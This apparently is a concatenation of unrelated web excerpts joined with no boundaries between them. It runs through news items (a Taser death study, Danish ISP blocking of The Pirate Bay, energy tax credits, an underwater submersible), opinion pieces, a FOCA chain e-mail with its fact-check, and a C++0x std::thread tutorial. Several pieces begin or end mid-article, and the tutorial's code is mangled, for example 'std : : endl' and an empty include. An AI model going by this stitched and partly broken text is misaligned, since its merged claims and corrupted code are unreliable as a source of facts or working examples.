In this particular case , based upon the recent published report by Dr. Tanner , the government cannot prove beyond a reasonable doubt the age of the female , an essential element of the crime charged .
As a result , the interest of justice demand that the United States dimiss the indictment against the defendant .
Yet state and federal prosecutors continue to use Tanner Staging in the reverse method that Dr. Tanner has condemned .
During her Daubert testimony , Dr. Barron stated that her mentor , Dr. Carole Jenny , and several others had been commissioned by the DOJ to write a chapter validating the use of Tanner Staging in alleged child porn cases .
Meanwhile , how many cases like this have the DOJ and Dr. Jenny covered up to protect this fraud ?

We hear a lot about things being " investments " — even when they are n't in actuality .
And one of those things is buying a home .
While we like to think that buying a home is making an investment ( and for some , the real estate bubble made it so ) , having a home mortgage loan is not an investment .
If you plan to use your home as a primary residence and raise a family in it , you are not making an investment .
You can buy a home , financing it with a mortgage , and enjoy a number of benefits .
Most of them are intangible :
* A place to call home .
* A ( usually ) safe and stable place for your children .
* Peace of mind . * A feeling of accomplishment . * A tax benefit on the mortgage interest and property taxes .
All of these are nice things .
But from a financial standpoint , paying a mortgage on your primary residence is n't making an investment .
( Buying property that you plan to make money on , like a rental , is another story . )
You do not get a regular return , and when you sell the home , chances are that even an appreciated home wo n't cover the real amount of money you 've paid out when you add in interest , taxes and maintenance .
But it 's still nice to have a home , even if it does come with mortgage .
We have enjoyed our home .
I just do n't tell myself it 's an investment .
It 's really a long - term purchase .

During their deployment to Helmand Province , Marines of B Company , 1st Battalion , 6th Marine Regiment had few options for killing time between pulling guard shifts or walking patrol .
They worked out on a ramshackle bench press ; jumped rope in the dust ; or played spades .
But the main focus of social life — if you could call it that — was a small pack of stray dogs ( and a kitten or two ) that shared the mud - brick compound .
Marines adopted the dogs after they started following them on foot patrols .
According to several of the Marines , some of the mutts even took to walking point , sniffing out ahead for any signs of danger .
The Marines rewarded the animals for loyalty by sharing their MREs and water .
The thin , rangy dogs quickly fattened up on a diet of packaged spaghetti and meatballs or Szechuan chicken .
Everyone had their favorites .
Kilo ( pictured here ) , a , pampered , overfed puppy .
Gross , who looked like a skinny lab or retriever .
And there was my personal favorite , Shins .
" You 'll recognize him , " said one Marine .
" He 's the ugliest dog in the world . "
The good - natured Shins looked like he had been raised to be a fighting dog ; his ears were brutally cropped .
And sure enough , he was ugly : his fur was a mottled brown and his forelegs seemed to be bowed from rickets .
Shins lolled happily in the dirt , enjoying his three squares a day .
Do n't get me wrong ; I 'm not really much of a dog person .
And this is Danger Room , not Modern Dog Magazine .
But the adopted animals were one of the things that made life bearable in an otherwise tedious — and often dangerous — place .
And hell , one of the puppies even has a MySpace page .

Start drinking coffee and cut your risk of Alzheimer 's disease
Four cups of coffee a day could keep Alzheimer 's at bay .
Drinking three to five coffees daily in middle age cuts the risk of developing the disease in old age by two - thirds , a study has found .
Other studies have hinted that caffeine can protect against dementia , but the latest research stands out because it charted people 's consumption over the decades before dementia appeared rather than relying on them to remember their intake .
Dr Susanne Sorensen , of the Alzheimer 's Society , said : ' For years we 've treated coffee as nothing more than a pleasant pick - me - up .
Drinking coffee in middle age can cut the risk of developing Alzheimer 's by two - thirds
' This is exciting as it indicates drinking coffee in midlife can actually reduce your risk . '
Swedish and Finnish researchers questioned 1,500 middle - aged men and women about their tea and coffee drinking .
Twenty - one years later , there were 61 dementia cases in the group .
Analysis showed that moderate coffee drinkers were the least likely to have developed dementia .
They had a third of the risk of those with a daily consumption of up to two cups , the Journal of Alzheimer 's Disease reports .
Drinking tea was uncommon among those studied and was not found to affect the risk .
However , coffee is not always beneficial to health .
Research released yesterday said that more than seven cups a day trebles the risk of hallucinations among the healthy .
Energy tax provisions slated for the massive economic stimulus bill include expanded incentives for plug - in electric vehicles .
Now that ’s seriously good news even though gas prices are the lowest they ’ve been in a long time .
The Senate unveiled yesterday that they would mark up the $ 272 billion tax measure as they are a promising way to help curb reliance on oil imports by effectively allowing electric power to substitute for oil - based transportation fuels .
The energy provisions total more than $ 30 billion over the course of a decade .
The package now expands an existing credit for plug - in electric vehicles by doubling the number eligible to 500,000 .
The size of the credit begins at $ 2,500 and expands with the amount of battery capacity .
The maximum credit for vehicles weighing 10,000 pounds or less is $ 7,500 , and higher amounts are available for heavier vehicles .
A separate change to the broad tax package modifies an existing credit for carbon sequestration .
Under current law , a credit of $ 20 per metric ton of carbon captured and sequestered in secure geologic storage is available .
Also , a credit of $ 10 per ton is available for carbon that is captured and used as a “ tertiary injectant ” for enhanced oil and gas recovery .
The change requires that the carbon used as a tertiary injectant must be sequestered in permanent geologic storage to qualify for the credit .
The overall package provides a suite of renewable energy and efficiency measures , such as a three - year extension of availability of tax credit for wind and some other projects , a new credit for manufacture of advanced energy - related equipment , and extended and expanded credits for energy efficient homes .
In addition to the tax provisions , the overall bill includes tens of billions in spending on energy programs , such as measures to increase federal building efficiency , help finance renewable energy projects , and deploy a “ smart ” electric power grid .
The House is scheduled to vote on its version of the bill today .
Democrats want to send a final House - Senate plan to President Barack Obama by mid-February .
The overall economic recovery plan is roughly $ 825 billion .

The FOCA is the next sick chapter in the book of abortion .
If made a law then all limitations on abortion will be lifted which will result inthe following : 1 ) All hospitals , including Catholic hospitals will be required to perform abortions upon request .
If this happens Bishops
vow to close down all Catholic hospitals , more then 30 % of all hospitals in the United States .
2 ) Partial birth abortions would be legal and have no limitations .
3 ) All U.S. tax payers would be funding abortions .
4 ) Parental notification will no longer be required .
5 ) The number of abortions will increase by a minimum of 100,000 annually .
Perhaps most importantly the government will now have control in the issue of abortion .
This could result in a future amendment that would force women by law to have abortions in certain situations ( rape , down syndrome babies , etc ) and could even regulate how many children women are allowed to have .
Needless to say this information is disturbing , but sadly true .
As Catholics , as Christians , as anyone who is against the
needless killing of innocent children , we must stand as one .
We must stop this horrific act before it becomes a law .
The Plan : To say a novena ( 9 days of prayer ) along with fasting starting on January 11th .
For Catholics , the prayer of choice will be the rosary with intentions to stop the FOCA .
For non Catholics
I encourage you to pray your strongest prayers with the same intentions , also for nine consecutive days .
The hope is that this will branch and
blossom as to become a global effort with maximum impact .
We have very little time so we all must act fast .
Just do three things :
1 ) Pass this letter to 5 or more people 2 ) Do it in three days or less 3 ) Start the novena on January 11th and pray for nine consecutive days .
( please also fast for at least two days during the novena ) Remember that with God all things are possible and the power of prayer is undeniable .
If you are against the senseless
killing of defenseless children then the time is now to do something about it !
May God bless you all !!
Origins : The Freedom of Choice Act ( FOCA ) , legislation which seeks to prohibit governmental restrictions on abortions performed prior to fetal viability , was introduced initially to the 108th Congress in 2004 and again to the 110th Congress in 2007 .
In both cases the House and Senate versions of the bills have been referred to committee with no further action taken .
As summarized by Congress , the Freedom of Choice Act :
Declares that it is the policy of the United States that every woman has the fundamental right to choose to : ( 1 ) bear a child ; ( 2 ) terminate a pregnancy prior to fetal viability ; or ( 3 ) terminate a pregnancy after fetal viability when necessary to protect her life or her health .
Declares that it is the policy of the United States that every woman has the fundamental right to choose to : a child ; a pregnancy prior to fetal viability ; ora pregnancy after fetal viability when necessary to protect her life or her health .
Prohibits a federal , state , or local governmental entity from : ( 1 ) denying or interfering with a woman ’s right to exercise such choices ; or ( 2 ) discriminating against the exercise of those rights in the regulation or provision of benefits , facilities , services , or information .
Provides that such prohibition shall apply retroactively .
Given the wording of the legislation , how it would be interpreted and applied should it be passed into law is currently a matter of some ambiguity , a situation that has led to number of claims and counter - claims from proponents and opponents of the bill — such as the ones expressed in the e-mailed appeal quoted above :
All hospitals , including Catholic hospitals will be required to perform abortions upon request .
Whether the FOCA would require Catholic hospitals ( and other health care providers ) morally opposed to abortion to perform that procedure upon request is a matter of contention .
Opponents maintain that FOCA would override current freedom - of - conscience laws , thereby forcing health care organizations to either perform abortions or risk losing any government funding they may receive :
While there is strenuous debate among legal experts on the matter , many believe the act would invalidate the freedom - of - conscience laws on the books in 46 states .
These are the laws that allow Catholic hospitals and health providers that receive public funds through Medicaid and Medicare to opt out of performing abortions .
Without public funds , these health centers could n’t stay open ; if forced to do abortions , they would sooner close their doors .
Proponents claim that since FOCA specifically prohibits governmental entities from imposing restrictions on abortion , it would not require non-government institutions such as Catholic hospitals to offer abortions upon request ( whether or not they currently receive any government funding ) :
Would FOCA force Catholic hospitals to perform abortions ?
Would FOCA force Catholic hospitals to perform abortions ?
Unequivocally no , says Jill Morrison , senior counsel at the National Women ’s Law Center .
Federal conscience clause law , such as the Church Amendment , states that simply receiving public funding does not turn a hospital into a “ state actor , ” Morrison explains .
“ FOCA must be read consistently with existing federal law , unless the new law explicitly provides that it is intended to repeal existing law . ”
Morrison adds , “ A hospital is not a state actor , and cannot be magically transformed into one due to its getting Federal funding , as set forth in the Church Amendment . ”
Partial birth abortions would be legal and have no limitations .
This is likely not completely accurate .
The Partial Birth Abortion Ban Act of 2003 currently prohibits partial - birth abortions in the U.S. Even
If FOCA overrode this law , its wording prohibits restrictions on abortion “ prior to fetal viability ” and “ after fetal viability when necessary to protect the life or health of the mother , ” so it could therefore be interpreted as not prohibiting restrictions on partial - birth abortions after the point of fetal viability when the health of the mother is not an issue .
All U.S. tax payers would be funding abortions .
To what extent the passage of FOCA might result in “ U.S. tax payers funding abortions ” is also a matter of contention .
FOCA contains no provisions for direct federal ( or other governmental ) funding of abortions , and the 1976 Hyde Amendment currently prohibits the use of any federal Medicaid funds to cover the costs of abortions .
Parental notification will no longer be required .
A plausible result of FOCA would be the overriding of laws requiring parental notification for abortions performed on minors .
The number of abortions will increase by a minimum of 100,000 annually .
To what extent passage of FOCA might increase the occurrence of abortion in the U.S. is also matter of contentious speculation .
Opponents claim that removing current restrictions on abortion ( such as parental notification requirements and bans on partial - birth abortions ) would result in a significant increase in the abortion rate .
Proponents maintain that FOCA would primarily serve to protect rights already place by serving as a bulwark against the imposition of additional restrictions on abortion ( or the overturning of Roe v. Wade ) and would therefore likely not result in a significant increase in the abortion rate .
This could result in a future amendment that would force women by law to have abortions in certain situations ( rape , down syndrome babies , etc ) and could even regulate how many children women are allowed to have .
The statement is unfounded .
FOCA itself contains no provisions for “ forcing women by law to have abortions in certain situations , ” and it specifically states that “ every woman has the fundamental right to choose to bear a child . ”

The number of in - custody sudden deaths rose dramatically during the first year California law enforcement agencies began using stun guns , raising questions about the safety of the devices , according to a new study at UCSF .
The electronic weapons are intended to be a nonlethal alternative to the gun .
" Tasers are not as safe as thought , " said Dr. Byron Lee , one of the cardiologists involved in studying the death rate related to Tasers , the most widely used stun gun .
" And if they are used , they should be used with caution . "
The researchers analyzed sudden death data from 50 law enforcement agencies in the state that use Tasers .
They compared the death rate pre- and post - Taser deployment - analyzing data for five years before each agency began using Tasers and five years afterward .
They found a sixfold increase in sudden deaths during the first year of Taser use - amounting to nearly 6 deaths per 100,000 arrests .
" I did n't expect what we found , " said Lee .
" I thought we would find no difference in the rate of sudden death .
But there was a rather dramatic rise . "
After the first year , the rate of sudden deaths dropped down to nearly pre-Taser levels , suggesting that police and others in law enforcement altered the way they were using the devices to make them less lethal .
" Sudden deaths are extremely rare events , but it is important to look into why these events happen and whether law enforcement agencies are fully informed of the real - world risks , " Lee said .
California does not have a statewide training standard for stun guns , which have been used in the state for decades .
" The manufacturer provides introductory training , then law enforcement agencies do supplemental training , " said Robert Stresak , a spokesman for the California Commission on Peace Officer Standards and Training , which sets minimum training standards .
" It 's on an agency by agency basis .
The content of the course could vary widely as to what is taught . "

Tasers , known as " conducted energy " devices , send out high - frequency pulses which can cause a very rapid , dangerous heart rhythm , said senior author Dr. Zian H. Tseng , an assistant clinical professor in cardiology .
" Maybe a simple change of technique is what is necessary , " he said .
" The longer you hold the trigger , the higher the danger to the heart .
...
The fewer pulses the better . "
San Francisco , which does not use the devices , was not part of the study .
Tseng declined to give specifics about local jurisdictions involved in the research but said that " Oakland did not give us data .
San Jose did give us data . "
Two years ago , Amnesty International reported 156 stun gun-related deaths of people in the United States during the previous five years .
The weapons have generated controversy , but a report last year which suggested a sweeping slate of reforms to the San Francisco Police Department said that allowing the use of Tasers may reduce injuries to officers and suspects .
Tasers are used by more than 12,000 law enforcement , military and correctional agencies in the U.S. and abroad , said UCSF 's Lee .
More intensive research is needed , particularly within law enforcement agencies that show a high sudden death rate , said Samuel Walker , one of the nation 's top police practices experts .
" We need good studies on the physiological impacts , " said Walker , an emeritus professor of criminal justice at the University of Nebraska in Omaha .
" I 'd want to know more about the deaths , interview the officers to find out if they self - corrected . "
The study 's findings were published online this week by the American Journal of Cardiology .
This is the third of a series of blog posts introducing the new C++0 x thread library .
The first two parts covered Starting Threads in C++0 x with simple functions , and starting threads with function objects and additional arguments .
If you 've read the previous parts of the series then you 've seen how to start threads with functions and function objects , with and without additional arguments .
However , the function objects and arguments are always copied into the thread 's internal storage .
What if you wish to run a member function other than the function call operator , or pass a reference to an existing object ?
The C++0 x library can handle both these cases : the use of member functions with std :: thread requires an additional argument for the object on which to invoke the member function , and references are handled with std::ref .
Let 's take a look at some examples .
Invoking a member function on a new thread
Starting a new thread which runs a member function of an existing object : you just pass a pointer to the member function and a value to use as the this pointer for the object in to the std :: thread constructor .
#include < thread > # include < iostream > class SayHello { public : void greeting ( ) const { std :: cout < <" hello " < < std : : endl ; } } ; int main ( ) { SayHello x ; std :: thread t( &SayHello : : greeting , &x ) ; t.join ( ) ; }
You can of course pass additional arguments to the member function too :
#include < thread > # include < iostream > class SayHello { public : void greeting ( std : : string const& message ) const { std :: cout << message << std::endl ; } } ; int main ( ) { SayHello x ; std :: thread t( &SayHello :: greeting , &x , " goodbye " ) ; t.join ( ) ; }
Now , the preceding examples both a plain pointer to a local object for the this argument ; if you 're going to do that , you need to ensure that the object outlives the thread , otherwise there will be trouble .
An alternative is to use a heap - allocated object and a reference - counted pointer such as std:: shared_ptr<SayHello > to ensure that the object stays around as long as the thread does :
# include <> int main ( ) { std::shared_ptr<SayHello> p( new SayHello ) ; std :: thread t( &SayHello :: greeting , p, " goodbye " ) ; t.join ( ) ; }
So far , everything we 've looked at has involved copying the arguments and thread functions into the internal storage of a thread even if those arguments are pointers , as in the this pointers for the member functions .
What if you want to pass in a reference to an existing object , and a pointer just wo n't do ?
That is the task of std::ref .
Passing function objects and arguments to a thread by reference
Suppose you have an object that implements the function call operator , and you wish to invoke it on a new thread .
The thing is you want to invoke the function call operator on this particular object rather than copying it .
You could use the member function support to call operator ( ) explicitly , but that seems a bit of a mess given that it is callable already .
This is the first instance in which std : : ref can help — if x is a callable object , then std : : ref ( x ) is too , so we can pass std : : ref ( x ) as our function when we start the thread , as below :
#include < thread > # include < iostream > # include < functional > // for std ::ref class PrintThis { public : void operator ( ) ( ) const { std:: cout <<" this = " << this < < std : : endl ; } } ; int main ( ) { PrintThis x ; x ( ) ; std :: thread t( std ::ref( x ) ) ; t.join ( ) ; std :: thread t2(x ) ; t2.join ( ) ; }
In this case , the function call operator just prints the address of the object .
The exact form and values of the output will vary , but the principle is the same : this little program should output three lines .
The first two should be the same , whilst the third is different , as it invokes the function call operator on a copy of x .
For one run on my system it printed the following :
this=0x7fffb08bf7ef this=0x7fffb08bf7ef this=0x42674098
Of course , std : : ref can be used for other arguments too — the following code will print " x=43 " :
#include < thread > # include < iostream > # include < functional > void increment ( int& i ) { ++i ; } int main ( ) { int x=42 ; std :: thread t( increment , std : :ref( x ) ) ; t.join ( ) ; std::cout <<" x= " <<x<< std::endl ; }
When passing in references like this ( or pointers for that matter ) , you need to be careful not only that the referenced object outlives the thread , but also that appropriate synchronization is used .
In this case it is fine , because we only access x before we start the thread and after it is done , but concurrent access would need protection with a mutex .
Next time
That wraps up all the variations on starting threads ; next time we 'll look at using mutexes to protect data from concurrent modification .

A Danish court has ruled that all Danish ISPs have to deny their users access to The Pirate Bay .
Most broadband providers are not too happy with this unbalanced decision , and three of them have already announced that they will take it to the Supreme Court .
In a court case initiated by the IFPI , a Danish judge ruled last year that Tele2 had to block its users from accessing The Pirate Bay .
IFPI argued that Tele2 was assisting in mass copyright infringement , and that access to the site therefore had to be blocked .
At the time , The Pirate Bay co-founder Brokep told TorrentFreak : “ I hope the torrent community understands what this will do to Danish people .
It will also act as a very bad precedent for the European Union , and I hope everybody will fight this . ”
Unfortunately for the many Danish Pirate Bay users , it got even worse .
Last month TDC , Denmark ’s largest ISP and owner of most of the cables , decided to block access to The Pirate Bay as a preventive measure .
And now , a Danish court has ruled that all ISPs will have to do the same , or else they will face a hefty fine .
The ISPs , however , are not planning to accept the court order without a fight .
TDC , Telia and Telenor have announced that they are going to appeal the decision , and they will take the case to the Supreme Court .
One of their arguments is that they are not responsible for the potential copyright infringement of their subscribers .
“ Accessing The Pirate Bay is not in itself a violation of copyright , ” Jens Ottosen of Telia told dn.se .
“ We make access possible for our subscribers , and they have to decide if it is illegal .
It is not our task .
If so , we also contribute to illegalities on YouTube , Myspace and Google .
It is completely cluttered , ” said Ottosen , who is also Chairman of the Danish telecom industry .
Indeed , this case is about more than just The Pirate Bay , it is about censoring the Internet .
Will YouTube with all its copyright infringing content be next on the list ?
Despite the argument whether it is fair to block a BitTorrent site or not , it is completely ineffective .
It is fairly easy to circumvent , and all the publicity will only drive the traffic figures up .

Malik Imtiaz , vice president of Pakistan People 's Party in Lahore , capital city of Punjab province , was traveling in his car when unidentified motorcyclists opened fire on him , the News Network International ( NNI ) news agency reported .
The assailants fled after the attack , said the report .
No group claimed responsibility of the incident .
The NNI quoted witnesses as saying that Imtiaz received one bullet at his chest and he died on way to hospital .

Chemical Ecology
Reptile Bouquet
A bounty of greasy molecules make up the personal cologne of the ancient tuatara
Michael Jacob Photography EAU DE TUATARA
A cornucopia of more than 150 molecules , including the newly identified tuataric acid , are produced in the skin glands of the ancient tuatara .
Researchers peeking into the skin glands of the tuatara , a reptile with an ancient lineage , are reporting that it contains an unexpectedly diverse cocktail of chemicals that may help the beast communicate and fight skin fungi .
The work could also provide new clues to reptilian evolution .
More than 150 different greasy glyceride - based molecules are produced by the tuatara , the only existing member of a reptile order called the Rynchocephalia , which thrived some 200 million years ago .
The tuatara now mostly burrows in the wilds of New Zealand ( Chem. Biodiversity 2009 , 6 , 1 ) .
Stefan Schulz , a chemist at the University of Braunschweig , in Germany , and collaborator Paul J. Weldon at the Smithsonian Institution , in Washington , D.C. , say they identified an unexpectedly diverse assortment of chemical combinations made from glycerol and short - chain fatty acids , including a never - before - seen molecule that they dubbed tuataric acid .
" No other vertebrate skin gland produces such a structurally diverse array of glycerides , " Schulz says .
Because every tuatara produces the skin glycerides in unique relative concentrations , the molecules may play a role in identifying individual tuataras or in territorial marking .
Schulz also proposes that free acids released during the degradation of the glycerides could have antifungal activity .
But these conclusions remain provisional pending behavioral studies on the tuatara , Schulz adds .
" This is a fine first step , but it is only half the story , since what we really need to know is the biological roles of these lipids , " chemical ecologist Jerrold Meinwald of Cornell University comments .
" So the chemistry is ahead of the biology , but it is still a good start . "
He must surely have chosen that gambit to give Ms. Fleming an opportunity to embarrass the White House .
She accused Mr. Hannity of “ selective outrage , ” countering that Laura Bush had cast an even more direct aspersion on Ms. Rice ’s personal life in a recent issue of People magazine .
The first lady said she thought that Ms. Rice would be a good candidate for the presidency but was not interested in running .
“ Probably because she is single , her parents are no longer living , she ’s an only child , ” Mrs. Bush said .
“ You need a very supportive family and supportive friends to have this job . ”
Perhaps the most damning evidence against Mr. Hannity is his insistence on attacking Bill and Hillary Clinton .
Real conservatives welcome Senator Clinton ’s presidential candidacy , calculating that she is too polarizing a figure ever to win in a general election .
But on the very weekend Senator Clinton made her first primary trip to Iowa , Mr. Hannity headlined his show with an exposé of the Clinton administration .
Showing an edited scene from the much - disputed ABC mini-series “ The Path to 9/11 , ” Mr. Hannity made the case that Mr. Clinton failed to eliminate Osama bin Laden during his presidency , then pressured ABC to recut the film to omit scenes that made his administration look ineffectual .
The segment subliminally underscored mistakes made by the Bush administration .
By focusing so intently on the government ’s failure to capture Mr. bin Laden in the years and months before 9/11 , Mr. Hannity rather pointedly reminds viewers that more than five years after Mr. bin Laden ordered suicide - hijackers to drive airplanes into the World Trade Center and the Pentagon , and after the deaths of more than 3,300 American troops in Iraq and Afghanistan , the Qaeda leader is still a free man .
But it ’s the sex and violence that suggest that Mr. Hannity harbors a secret plan to undermine American moral fiber .
Despite President Bush ’s assertion that the execution of Saddam Hussein was botched and disgraceful , Mr. Hannity repeatedly flashes some of the more gruesome video images of the hanging , pictures so ghoulish and unsettling that they could well be the fare for a snuff film .
Sometimes he showcases violence that has absolutely no redeeming journalistic value .
A recent feature about an indoor dodge ball tournament focused on whether players aimed at opponents ’ genitals , using a term that is too colloquial and vulgar to repeat here .
( CNN ) --
Most people have had dreams of flying .
Graham Hawkes had dreams of flying -- underwater .
The Deep Flight Super Falcon made its maiden voyage in San Francisco Bay in September .
Hawkes has been in the business of building underwater craft for more than a decade .
In the early days , his company , Hawkes Ocean Technologies , built vehicles for researchers and moviemakers .
But in the past few years , the ultrarich have increasingly looked for cool playthings for their ocean adventures .
What better toy to have on the end of your 200 - foot yacht than a submarine capable of diving to 1,500 feet below the sea 's surface ?
Watch the flying sub in action »
Whoops .
Did we say submarine ?
It 's a submersible that can " fly " underwater .
The Deep Flight Super Falcon looks like a fighter jet , with its thin body , two seats , two sets of wings and two tail fins .
" We just had to tear up everything we knew about submersibles and start again on winged subs -- underwater flying machines , " Hawkes said .
He said Deep Flight submersibles are designed to be more agile than any creature living in the ocean -- with the exception of dolphins .
The company says that because of the wings , the Super Falcon can go barrel - rolling with dolphins while traveling at speeds much faster than other private submarines .
The craft can stay underwater for up to five hours and travel at speeds up to 6 knots , the company says on its Web site .
The first client for the Super Falcon was venture capitalist Tom Perkins , who wanted a toy to keep on his mega- yacht , the Maltese Falcon .
The base price : $ 1.3 million .
Another model , which has open cockpits and cannot dive as deep as the Super Falcon , sells for $ 350,000 .
Perkins , writing in Boating International magazine , said he joined the project to take the Super Falcon from prototype to a fully functional craft .
" Like some of my other projects , we did n't finish on time , but also like some of the others , the end result exceeded all our expectations , " he said .
The second machine is being built for Hawkes ' personal use .
A submarine driver would n't recognize the cockpit of the Super Falcon .
" There are no valves , there are no gauges , " Hawkes said .
" You just power up the thrusters , start your take - off run , put the joystick forward , then the nose goes down .
The wings literally pull it down . "
That 's very different from conventional submarines , which basically dive by changing the ballast of the ship to make it sink .
" It 's not just that they look like airplanes , they actually are , " Hawkes said .
" The machines we build underwater should look like airplanes , not submarines .
Airplanes do n't look like balloons . "
He wo n't take credit for the idea , saying the idea of a submarine with fins and wings has been thought of before .
The 1943 French comic book , " Red Rackham 's Treasure , " included a shark - like submarine with dorsal fins and a tail .
Hawkes said that although the idea of wings may have been obvious , " The prize goes to he that does . "
On one of the submersible 's first test voyages , Hawkes ' team encountered a group of hammerhead sharks .
The sharks were curious and swam around the watercraft .
One engaged the sub in a game of chicken , only to veer off at the last minute .
It was a great reward , Hawkes said .
The craft is powered by batteries and the turbines that drive the ship were made with special care to be incredibly quiet .
The maneuverability also lets it navigate in strong currents that stifle other underwater craft , the creators said .
The business plan for Deep Flight includes schools for underwater pilots to fly future versions of the Super Falcon .
The next school is scheduled for this summer in the Turks and Caicos , said Karen Hawkes , the company 's manager of marketing and communications , in an e-mail .
The three - day course costs $ 17,000 .
There is also a half - day , ride - along dive that costs $ 5,500 .
Karen
Hawkes said the company enrolls 10 to 15 people per course and had open spots for this summer 's courses .
She also wrote that while " there really is n't something akin to the FAA governing submersible operations , " her company thinks sub manufacturers should offer pilot training to the owners of machine .
Then the owner can load his or her new toy onto their yacht and discover the underwater portion of this planet that most people never see , Hawkes said .
" Do you want to stalk a shark ? " he asked .
" Do you want to go to a Great White and go woo - hoo ?
Do you want to do a barrel roll with a whale ?
" Shall we go and find some territories that humans have never seen before ? ...
Get in one of these machines , get below 150 feet -- the deepest that divers go -- and you are the first human eyes to look at that piece of the planet . "
What do we mean by poverty ?
Not what Dickens or Blake or Mayhew meant .
Today , no one seriously expects to go hungry in England or to live without running water or medical care or even TV .
Poverty has been redefined in industrial countries , so that anyone at the lower end of the income distribution is poor ex officio , as it were — poor by virtue of having less than the rich .
And of course by this logic , the only way of eliminating poverty is by an egalitarian redistribution of wealth — even if the society as a whole were to become poorer as a result .
Such redistribution was the goal of the welfare state .
But it has not eliminated poverty , despite the vast sums expended , and despite the fact that the poor are now substantially richer — indeed are not , by traditional standards , poor at all .
As long as the rich exist , so must the poor , as we now define them .
Certainly they are in squalor — a far more accurate description of their condition than poverty — despite a threefold increase in per-capita income , including that of the poor , since the end of the last war .
Why they should be in this condition requires an explanation — and to call that condition poverty , using a word more appropriate to Mayhew 's London than to today 's reality , prevents us from grasping how fundamentally the lot of " the poor " has changed since then .
The poor we shall always have with us , no doubt : but today they are not poor in the traditional way .
The English poor live shorter and less healthy lives than their more prosperous compatriots .
Even if you did n't know the statistics , their comparative ill health would be obvious on the most casual observation of rich and slum areas , just as Victorian observers noted that the poor were on average a head shorter than the rich , due to generations of inferior nourishment and hard living conditions .
But the reasons for today 's difference in health are not economic .
It is by no means the case that the poor can't afford medicine or a nourishing diet ; nor do they live in overcrowded houses lacking proper sanitation , as in Mayhew 's time , or work 14 backbreaking hours a day in the foul air of mines or mills .
Epidemiologists estimate that the higher rate of cigarette consumption among the poor accounts for half the difference in life expectancy between the richest and poorest classes in England — and to smoke that much takes money .
Notoriously , too , the infant mortality rate is twice as high in the lowest social class as in the highest .
But the infant mortality rate of illegitimate births is twice that of legitimate ones , and the illegitimacy rate rises steeply as you descend the social scale : so the decline of marriage almost to the vanishing point in the lowest social class might well be responsible for most of its excess infant mortality .
It is a way of life , not poverty per se , that kills .
The commonest cause of death between the ages of 15 and 44 is now suicide , which has increased most precipitously precisely among those who live in the underclass world of temporary step - parenthood and of conduct unrestrained either by law or convention .
Just as it is easier to recognize ill health in someone you have n't seen for some time rather than in someone you meet daily , so a visitor coming into a society from elsewhere often can see its character more clearly than those who live in it .
Every few months , doctors from countries like the Philippines and India arrive fresh from the airport to work for a year 's stint at my hospital .
It is fascinating to observe their evolving response to British squalor .
At the start , they are uniformly enthusiastic about the care that we unsparingly and unhesitatingly give to everyone , regardless of economic status .
They themselves come from cities — Manila , Bombay , Madras — where many of the cases we see in our hospital would simply be left to die , often without succor of any kind .
And they are impressed that our care extends beyond the merely medical : that no one goes without food or clothing or shelter , or even entertainment .
There seems to be a public agency to deal with every conceivable problem .
For a couple of weeks , they think this all represents the acme of civilization , especially when they recall the horrors at home .
Poverty — as they know it — has been abolished .
Before very long , though , they start to feel a vague unease .
A Filipina doctor , for example , asked me why so few people seemed grateful for what was done for them .
What prompted her question was an addict who , having collapsed from an accidental overdose of heroin , was brought to our hospital .
He required intensive care to revive him , with doctors and nurses tending him all night .
His first words to the doctor when he suddenly regained consciousness were , " Get me a fucking roll - up " ( a hand - rolled cigarette ) .
His imperious rudeness did n't arise from mere confusion : he continued to treat the staff as if they had kidnapped him and held him in the hospital against his will to perform experiments upon him .
" Get me the fuck out of here ! "
There was no acknowledgment of what had been done for him , let alone gratitude for it .
If he considered that he had received any benefit from his stay at all , well , it was simply his due .
My doctors from Bombay , Madras , or Manila observe this kind of conduct open - mouthed .
At first they assume that the cases they see are a statistical quirk , a kind of sampling error , and that given time they will encounter a better , more representative cross section of the population .
Gradually , however , it dawns upon them that what they have seen is representative .
When every benefit received is a right , there is no place for good manners , let alone for gratitude .
Case after case causes them to revise their initial favorable opinion .
Before long , they have had experience of hundreds , and their view has changed entirely .
Last week , for example , to the amazement of a doctor recently arrived from Madras , a woman in her late twenties entered our hospital with the most common condition that brings patients to us : a deliberate overdose .
At first she would say nothing more than that she wanted to depart this world , that she had had enough of it .
I inquired further .
Just before she took the overdose , her ex-boyfriend , the father of her eight - month - old youngest child ( now staying with her ex-boyfriend 's mother ) , had broken into her apartment by smashing down the front door .
He wrecked the apartment 's contents , broke every window , stole $ 110 in cash , and ripped out her telephone .
" He 's very violent , doctor . "
She told me that he had broken her thumb , her ribs , and her jaw during the four years she was with him , and her face had needed stitching many times .
" Last year I had to have the police out to him . "
" What happened ? "
" I dropped the charges .
His mother said he would change . "
Another of her problems was that she was now five weeks pregnant and she did n't want the baby .
" I want to get rid of it , doctor . "
" Who 's the father ? "
It was her violent ex-boyfriend , of course .
" Did he rape you , then ? "
" No . "
" So you agreed to have sex with him ? "
" I was drunk ; there was no love in it .
This baby is like a bolt out of the blue : I do n't know how it happened . "
I asked her if she thought it was a good idea to have sex with a man who had repeatedly beaten her up , and from whom she said she wished to separate .
" It 's complicated , doctor .
That 's the way life goes sometimes . "
What had she known of this man before she took up with him ?
She met him in a club ; he moved in at once , because he had nowhere else to stay .
He had a child by another woman , neither of whom he supported .
He had been in prison for burglary .
He took drugs .
He had never worked , except for cash on the side .
Of course he never gave her any of his money , instead running up her telephone bills vertiginously .
She had never married , but had two other children .
The first , a daughter aged eight , still lived with her .
The father was a man whom she left because she found he was having sex with 12 - year - old girls .
Her second child was a son , whose father was " an idiot " with whom she had slept one night .
That child , now six , lived with the " idiot , " and she never saw him .
What had her experience taught her ?
" I do n't want to think about it .
The Housing 'll charge me for the damage , and I ain't got the money .
I 'm depressed , doctor ; I 'm not happy .
I want to move away , to get away from him . "
Later in the day , feeling a little lonely , she telephoned her ex-boyfriend , and he visited her .
I discussed the case with the doctor who had recently arrived from Madras , and who felt he had entered an insane world .
Not in his wildest dreams had he imagined it could be like this .
There was nothing to compare with it in Madras .
He asked me what would happen next to the happy couple .
" They 'll find her a new flat .
They 'll buy her new furniture , television , and refrigerator , because it 's unacceptable poverty in this day and age to live without them .
They 'll charge her nothing for the damage to her old flat , because she can't pay anyway , and it was n't she who did it .
He will get away scot - free .
Once she 's installed in her new flat to escape from him , she 'll invite him there , he 'll smash it up again , and then they 'll find her somewhere else to live .
There is , in fact , nothing she can do that will deprive her of the state 's obligation to house , feed , and entertain her . "
I asked the doctor from Madras if poverty was the word he would use to describe this woman 's situation .
